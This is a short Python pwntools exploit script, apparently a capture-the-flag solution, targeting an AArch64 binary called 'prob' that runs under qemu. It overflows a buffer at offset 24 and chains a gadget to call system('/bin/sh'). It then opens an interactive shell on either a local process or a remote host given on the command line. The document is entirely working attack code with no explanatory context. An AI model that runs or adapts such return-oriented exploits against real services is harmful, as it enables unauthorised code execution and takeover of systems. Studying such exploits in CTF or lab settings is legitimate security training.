#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('prob')

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return process(["qemu-aarch64-static", "-g", "5000", exe.path])
        # return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process(["qemu-aarch64-static", exe.path] + argv, *a, **kw)
    

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 24
    gadget = 0x0000000000444090 # ldp x1, x0, [sp, #0x38]; blr x1;
    padding = [p64(0xdeadbeef)] * 7

    system = exe.sym["system"]
    sh = next(exe.search(b"/bin/sh"))

    payload = flat({
        offset: [
            gadget,
            [*padding],
            system,
            sh
        ]
    })

    io.sendlineafter(b":", payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

